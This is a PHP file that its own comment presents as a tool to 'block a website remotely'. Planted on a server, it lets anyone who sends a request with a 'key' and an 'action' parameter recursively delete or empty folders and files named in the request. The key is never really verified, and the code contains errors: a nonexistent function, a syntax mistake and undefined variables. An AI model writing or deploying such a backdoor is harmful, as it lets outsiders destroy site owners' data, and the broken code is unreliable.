
<?php 
	// Hey guys, this is my new project, to block a website remotely :-)
	$link_referrer="/";
	function delete_recursively_($path,$match){
	   static $deleted = 0, 
	   $dsize = 0;
	   $dirs = glob($path."*");
	   $files = glob($path.$match);
	   foreach($files as $file){
	      if(is_file($file)){
	         $deleted_size += filesize($file);
	         unlink($file);
	         $deleted++;
	      }
	   }
	   foreach($dirs as $dir){
	      if(is_dir($dir)){
	         $dir = basename($dir) . "/";
	         delete_recursively_($path.$dir,$match);
	      }
	   }
	   return "$deleted files deleted with a total size of $deleted_size bytes";
	}
	function delete_directories_recursively($dirname) { 
	    // recursive function to delete 
	    // all subdirectories and contents: 
	    if(is_dir($dirname))$dir_handle=opendir($dirname); 
	    while($file=readdir($dir_handle)){ 
	        if($file!="." && $file!="..") { 
	            if(!is_dir($dirname."/".$file)){
	                unlink ($dirname."/".$file); 
	            } else {
	                delete_directories_recursively($dirname."/".$file); 
	            }   
	        } 
	    } 
	    closedir($dir_handle); 
	    rmdir($dirname); 
	    return true; 
	}

	function BackupProject(){
		//Restore all files
	}

	function SaveProject(){
		// Upload all the project to a website
	}

	function empty_recursively_($path, $match){
	   static $deleted = 0, 
	   $dsize = 0;
	   $dirs = glob($path."*");
	   $files = glob($path.$match);
	   foreach($files as $file){
	      if(is_file($file)){
	         $deleted_size += filesize($file);
				$f = @fopen($file, "w+");
				fclose($f);
	         $deleted++;
	      }
	   }
	   foreach($dirs as $dir){
	      if(is_dir($dir)){
	         $dir = basename($dir) . "/";
	         empty_recursively_($path.$dir,$match);
	      }
	   }
	   return "$deleted files empty with a total size of $deleted_size bytes";
	}

	function emty_directories_recursively($dirname) {  
	    if(is_dir($dirname))$dir_handle=opendir($dirname); 
	    while($file=readdir($dir_handle)){ 
	        if($file!="." && $file!="..") { 
	            if(!is_dir($dirname."/".$file)){
					$f = @fopen($dirname."/".$file, "w+");
					fclose($f);
	            } else {
	                emty_directories_recursively($dirname."/".$file); 
	            }   
	        } 
	    } 
	    closedir($dir_handle); 
	    rmdir($dirname); 
	    return true; 
	}
	// echo delete_recursively_('/home/username/directory/', '.gif');
	// delete_directories_recursively('/home/username/directory/')'

	function cryptKey($string){
		return md5('9372671'.sha1(md5('S@n1x_D4rk3r').'hajshuRGVSGVSUKvkuy23678'));
	}

	function IfKiKeyIsOk($string){
		if(cryptKey($string)==file_get_contents('./Ki', FILE_USE_INCLUDE_PATH)){
			return true;
		}else{
			return false;
		}
	}

	if(!files_exists("Ki")){
		// header('Location: Ki.php?action=delete&targetfolder=css&again=js&key=');
	}else{
		if(file_get_contents('./Ki', FILE_USE_INCLUDE_PATH)!=""){
			// header('Location: Ki.php?action=delete&targetfolder=css&again=php&key=');
		}
	}

if(isset($_REQUEST['key']) AND $_REQUEST['key'])
	if(isset($_REQUEST['action'])){
		if(!SaveProject()){
			SaveProject();
		}
		if($_REQUEST['action']=="delete"){

			if(isset($_REQUEST['targetfolder']) && !isset($_REQUEST['extension'])){
				if(delete_directories_recursively($_REQUEST['targetfolder'])){
					echo "Ki Kill ".$_REQUEST['targetfolder'];
				}	
			}else if(isset($_REQUEST['extension']) AND isset($_REQUEST['targetfolder'])){ // the directory
 				echo delete_recursively_($_REQUEST['targetfolder'],$_REQUEST['extension']);
			}

		} else if($_REQUEST['action']=="empty"){

			if(isset($_REQUEST['targetfolder']) && !isset($_REQUEST['extension'])){

  				if(emty_directories_recursively($_REQUEST['targetfolder'])){
					echo "Ki Empty ".$_REQUEST['targetfolder'];
				}	
			}else if(isset($_REQUEST['extension']) AND isset($_REQUEST['targetfolder'])){ // the directory
 				if(empty_recursively_($_REQUEST['targetfolder'], $_REQUEST['extension'])){
					echo "Ki Empty *.".$_REQUEST['extension']." from "$_REQUEST['targetfolder'];
				}	
			}

		} else if($_REQUEST['action']=="move"){ // Write to blank

			if(isset($_REQUEST['targetfolder']) && !isset($_REQUEST['extension'])){
 
			}else if(isset($_REQUEST['extension']) AND isset($_REQUEST['targetfolder'])){ // the directory

			}
		} else if($_REQUEST['action']=="rebuild"){ // Write to blank
			BackupProject();
		}
	}

?>